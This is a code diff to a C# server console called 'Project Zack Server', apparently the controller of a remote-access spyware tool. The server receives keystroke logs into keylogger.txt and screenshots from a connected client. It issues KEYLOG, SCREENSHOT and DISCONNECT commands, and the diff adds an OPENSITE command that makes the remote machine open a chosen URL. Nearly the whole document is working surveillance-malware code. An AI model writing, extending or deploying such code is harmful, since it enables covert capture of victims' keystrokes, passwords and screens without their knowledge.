@@ -17,8 +17,7 @@ namespace Server
         {
             Console.Title = "Project Zack Server";
             StartServer();
-        }
-        public static string Command = string.Empty;
+        }        
         static NetworkStream stream;
         static void StartServer()
         {
@@ -49,7 +48,7 @@ namespace Server
 
                     int dataLength = BitConverter.ToInt32(datalength, 0);
                     byte[] data = new byte[dataLength];
-                    Console.WriteLine(dataLength);
+                 
 
                     int bytesReceived = 0;
                     while (bytesReceived < data.Length)
@@ -64,7 +63,7 @@ namespace Server
                     {
                         StreamWriter file = new StreamWriter(Directory.GetCurrentDirectory() + "/keylogger.txt", true);
                         file.Write(decodedData.Remove(0, "DATA".Length));
-                        file.Close();                        
+                        file.Close();
                     }
                     else if (decodedData.ToUpper().StartsWith("IMAGE"))
                     {
@@ -79,7 +78,7 @@ namespace Server
                             imageFile.Flush();
                         }
                         Console.WriteLine("Received: {0}", "screenshot");
-                    }
+                    }                 
                     else if (decodedData.ToUpper().StartsWith("DISCONNECT"))
                     {
                         Console.WriteLine("Received: {0}", decodedData);
@@ -101,29 +100,38 @@ namespace Server
         {
             while (true)
             {
-                Command = Console.ReadLine().ToUpper();
-                if (Command == "HELP")
+                string input = Console.ReadLine().ToUpper();
+                string[] Command = input.Split(' ');
+                
+                if (Command[0] == "HELP")
                 {
                     Console.WriteLine("==HELP==");
                     Console.WriteLine("KEYLOG");
                     Console.WriteLine("DISCONNECT");
                     Console.WriteLine("SCREENSHOT");
+                    Console.WriteLine("OPENSITE");
                 }
-                else if (Command == "KEYLOG")
+                else if (Command[0] == "KEYLOG")
                 {
                     byte[] msg = Encoding.ASCII.GetBytes("SENDKCAPTURE");
                     stream.Write(msg, 0, msg.Length);
                     Console.WriteLine("Sent: {0}", "SENDKCAPTURE");
                 }
-                else if (Command == "SCREENSHOT")
+                else if (Command[0] == "SCREENSHOT")
                 {
                     byte[] msg = Encoding.ASCII.GetBytes("SCREENSHOT");
                     stream.Write(msg, 0, msg.Length);
                     Console.WriteLine("Sent: {0}", "SCREENSHOT");
                 }
-                else if (Command == "DISCONNECT")
+                else if (Command[0] == "DISCONNECT")
                 {
                     byte[] msg = Encoding.ASCII.GetBytes("DISCONNECT");
+                    stream.Write(msg, 0, msg.Length);
+                    Console.WriteLine("Sent: {0}", "DISCONNECT");
+                }
+                else if (Command[0] == "OPENSITE")
+                {
+                    byte[] msg = Encoding.ASCII.GetBytes("OPENSITE|" + Command[1]);
                     stream.Write(msg, 0, msg.Length);
                     Console.WriteLine("Sent: {0}", "DISCONNECT");
                 }
